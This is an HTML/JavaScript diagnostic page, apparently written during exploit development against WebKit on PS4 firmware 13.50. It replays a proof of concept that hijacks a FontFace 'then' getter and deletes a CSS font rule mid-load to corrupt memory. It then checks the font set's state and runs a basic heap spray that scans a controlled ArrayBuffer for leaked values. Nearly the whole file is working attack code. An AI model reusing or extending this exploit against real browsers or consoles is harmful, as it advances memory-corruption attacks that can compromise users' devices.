<!DOCTYPE html>
<html>
<head></head>
<body>
<h1 id="status">Diagnostic Test</h1>
<button onclick="runTest()" style="font-size: 20px; padding: 10px;">RUN TEST</button>
<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre; border: 1px solid white; padding: 5px;"></div>

<script>
let testPhase = 0;

function log(msg) {
    let d = document.getElementById('log');
    if (d) d.textContent += msg + '\n';
}

function hex(n) {
    return '0x' + n.toString(16).padStart(8, '0');
}

function runTest() {
    testPhase++;
    
    if (testPhase === 1) {
        log('[TEST 1] Does original bug still trigger OOM?\n');
        
        // Use EXACT original PoC that worked before
        let style = document.createElement('style');
        style.id = 's';
        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(style);
        
        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;
            
            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        log('[!] GETTER TRIGGERED');
                        
                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                        document.getElementById('s').sheet.deleteRule(0);
                        document.body.offsetTop;
                        
                        log('[!] CORRUPTION DONE');
                    }
                    return undefined;
                }
            });
            
            log('[*] Calling fonts.load()...');
            document.fonts.load('1em x', 'AB');
            log('[*] fonts.load() returned');
            
            setTimeout(() => {
                log('\n[?] Did OOM error appear?');
                log('[?] If NO OOM: browser might have patched or cached state is preventing it');
                log('[?] If YES OOM: click button again for next test');
            }, 500);
        };
        
        // Trigger onload manually since page already loaded
        if (document.readyState === 'complete') {
            window.onload();
        }
        
    } else if (testPhase === 2) {
        log('\n[TEST 2] Check what we actually have\n');
        
        // Check if corruption persists
        log('[*] Checking document.fonts state:');
        log('    size: ' + document.fonts.size);
        log('    status: ' + document.fonts.status);
        
        // Try to enumerate fonts
        try {
            let count = 0;
            document.fonts.forEach(f => {
                log('    font[' + count + ']: family=' + f.family + ' status=' + f.status);
                count++;
                if (count > 5) return; // Limit output
            });
        } catch(e) {
            log('    Error enumerating: ' + e.message);
        }
        
        log('\n[*] Testing if we can still create corrupted fonts:');
        try {
            // Try to recreate corruption WITHOUT the CSS trick
            let test = new FontFace('test', 'local(Helvetica)', { unicodeRange: 'U+0050' });
            log('    Created FontFace: ' + test.family);
            log('    Status: ' + test.status);
            
            // Can we add to document.fonts?
            document.fonts.add(test);
            log('    Added to document.fonts');
            log('    New size: ' + document.fonts.size);
            
        } catch(e) {
            log('    Error: ' + e.message);
        }
        
        log('\nClick for Test 3');
        
    } else if (testPhase === 3) {
        log('\n[TEST 3] Basic heap spray test\n');
        
        // Create controlled buffer
        let ab = new ArrayBuffer(0x10000);
        let u32 = new Uint32Array(ab);
        let f64 = new Float64Array(ab);
        
        // Fill with known pattern
        for (let i = 0; i < 256; i++) {
            u32[i] = 0xDEAD0000 + i;
        }
        
        log('[*] Created controlled buffer');
        log('    Size: 0x10000 bytes');
        log('    u32[0]: ' + hex(u32[0]));
        log('    u32[100]: ' + hex(u32[100]) + '\n');
        
        // Spray objects
        log('[*] Spraying 1000 objects...');
        let spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({
                id: i,
                marker: 0x41420000 + i,
                buf: new ArrayBuffer(0x100)
            });
        }
        log('    Done\n');
        
        // Check if anything changed in our buffer
        log('[*] Checking if spray affected our buffer:');
        log('    u32[0] now: ' + hex(u32[0]));
        log('    u32[100] now: ' + hex(u32[100]));
        log('    Changed: ' + (u32[0] !== 0xDEAD0000) + '\n');
        
        // Look for anything unusual in buffer
        log('[*] Scanning buffer for non-pattern values:');
        let found = 0;
        for (let i = 0; i < 256; i++) {
            let expected = 0xDEAD0000 + i;
            if (u32[i] !== expected) {
                log('    [' + i + '] expected=' + hex(expected) + ' got=' + hex(u32[i]));
                found++;
            }
        }
        
        if (found === 0) {
            log('    All values match pattern - no corruption detected');
        }
        
        log('\n[TEST 3] Complete');
        log('\n[CONCLUSION]');
        log('If no OOM appeared in Test 1: Need to figure out why corruption stopped');
        log('If OOM appeared but no leaks: Need different leak strategy');
    }
}

log('PS4 13.50 WebKit Diagnostics\n');
log('Click RUN TEST to check if bug still works\n');
</script>
</body>
</html>
